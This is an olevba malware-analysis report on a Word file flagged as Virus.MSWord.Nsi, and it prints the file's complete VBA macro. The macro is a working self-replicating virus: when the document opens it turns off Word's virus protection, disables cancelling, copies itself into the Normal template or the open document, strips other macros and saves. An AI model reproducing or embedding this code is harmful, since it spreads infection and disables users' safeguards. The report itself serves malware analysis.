olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nsi-3f13bdc88a242071f691965df4d0f782e378050d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nsi-3f13bdc88a242071f691965df4d0f782e378050d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Options.VirusProtection = False
    EnableCancelKey = wdCancelDisabled
    Set maci = MacroContainer.VBProject.VBComponents.Item(1)
    Set macic = maci.CodeModule
    ns$ = Left(macic.lines(1, 1), 21)
    Set inf = NormalTemplate: nsi$ = ns$ + "Close()"
        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "Open()"
    Set infc = inf.VBProject.VBComponents
    Set infi = infc.Item(1)
    Set infic = infi.CodeModule
    infi.Name = "ThisDocument"
    For mx = 2 To infc.Count
        infc.Remove infc.Item(2)
    Next mx
        If infic.countlines <> macic.CountOfLines Then
            infic.DeleteLines 1, infic.CountOfLines
            For coco = 1 To macic.CountOfLines
                infic.insertlines coco, macic.lines(coco, 1)
            Next coco
            infic.replaceline 1, nsi$
        End If
    If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    EnableCancelKey = wdCancelDisabled
End Sub
'ThisDocument v 1.0 1999

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

